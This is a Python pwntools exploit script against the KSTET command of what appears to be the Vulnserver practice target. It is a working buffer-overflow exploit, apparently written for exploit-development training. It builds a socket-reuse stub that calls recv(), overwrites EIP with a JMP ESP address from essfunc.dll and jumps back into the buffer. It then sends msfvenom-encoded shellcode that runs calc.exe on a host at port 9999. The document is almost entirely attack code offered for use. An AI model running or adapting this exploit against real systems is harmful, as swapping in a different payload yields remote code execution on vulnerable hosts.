#!/usr/bin/python3
from pwn import remote, p32, asm, sleep

prefix = b"KSTET "

"""
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
"""

recv  = b""
recv += asm("add sp, 0x188")        # mov esp to socket descriptor
recv += asm("pop esi")              # save socket descriptor in $esi
recv += asm("push esi")             # push the dword from the stack
recv += asm("sub sp, 0x188")        # return $esp to its original state
recv += asm("sub esp, 0x64")        # sub esp to avoud overwriting
recv += asm("xor ebx, ebx")         # convert $ebx to 0x0
recv += asm("push ebx")             # push argumen (flags)
recv += asm("add bh, 0x4")          # convert $ebx to 0x400
recv += asm("push ebx")             # push argument (len)
recv += asm("mov ebx, esp")         # convert $ebx in $esp
recv += asm("add bx, 0x64")         # add 0x64 to $ebx
recv += asm("push ebx")             # push argument (*buf)
recv += asm("push esi")             # push argument (s)
recv += asm("mov eax, 0x4061F490")  # save recv() in $eax with nop
recv += asm("shr eax, 0x8")         # del nop for function addr
recv += asm("call dword ptr [eax]") # call $eax with the arguments

# !py mona pattern_offset eip
offset = 70
junk = b"A" * (offset - len(recv))

# !py mona jmp -r esp -m essfunc.dll
jmpesp = p32(0x625011af)

# 70 (junk) + 4 (ret) = 74
jmpback = asm("jmp $-74")

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\x91\x44\xfe\x22\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x6d\xac\x7c\x22\x8d\x2d\xe1\xaa"
shellcode += b"\x68\x1c\x21\xc8\xf9\x0f\x91\x9a\xaf\xa3\x5a"
shellcode += b"\xce\x5b\x37\x2e\xc7\x6c\xf0\x85\x31\x43\x01"
shellcode += b"\xb5\x02\xc2\x81\xc4\x56\x24\xbb\x06\xab\x25"
shellcode += b"\xfc\x7b\x46\x77\x55\xf7\xf5\x67\xd2\x4d\xc6"
shellcode += b"\x0c\xa8\x40\x4e\xf1\x79\x62\x7f\xa4\xf2\x3d"
shellcode += b"\x5f\x47\xd6\x35\xd6\x5f\x3b\x73\xa0\xd4\x8f"
shellcode += b"\x0f\x33\x3c\xde\xf0\x98\x01\xee\x02\xe0\x46"
shellcode += b"\xc9\xfc\x97\xbe\x29\x80\xaf\x05\x53\x5e\x25"
shellcode += b"\x9d\xf3\x15\x9d\x79\x05\xf9\x78\x0a\x09\xb6"
shellcode += b"\x0f\x54\x0e\x49\xc3\xef\x2a\xc2\xe2\x3f\xbb"
shellcode += b"\x90\xc0\x9b\xe7\x43\x68\xba\x4d\x25\x95\xdc"
shellcode += b"\x2d\x9a\x33\x97\xc0\xcf\x49\xfa\x8e\x0e\xdf"
shellcode += b"\x81\xfd\x11\xdf\x89\x51\x7a\xee\x02\x3e\xfd"
shellcode += b"\xef\xc1\x7a\xf1\xa5\x4b\x2a\x9a\x63\x1e\x6e"
shellcode += b"\xc7\x93\xf5\xad\xfe\x17\xff\x4d\x05\x07\x8a"
shellcode += b"\x48\x41\x8f\x67\x21\xda\x7a\x87\x96\xdb\xae"
shellcode += b"\xe4\x79\x48\x32\xc4\x1c\xe8\xd1\x18\xdf\x08"
shellcode += b"\x1a\x18\xdf\x08\x1a"

payload = prefix + recv + junk + jmpesp + jmpback

shell = remote("Windows", 9999)
shell.sendline(payload)

sleep(1)
shell.sendline(shellcode)
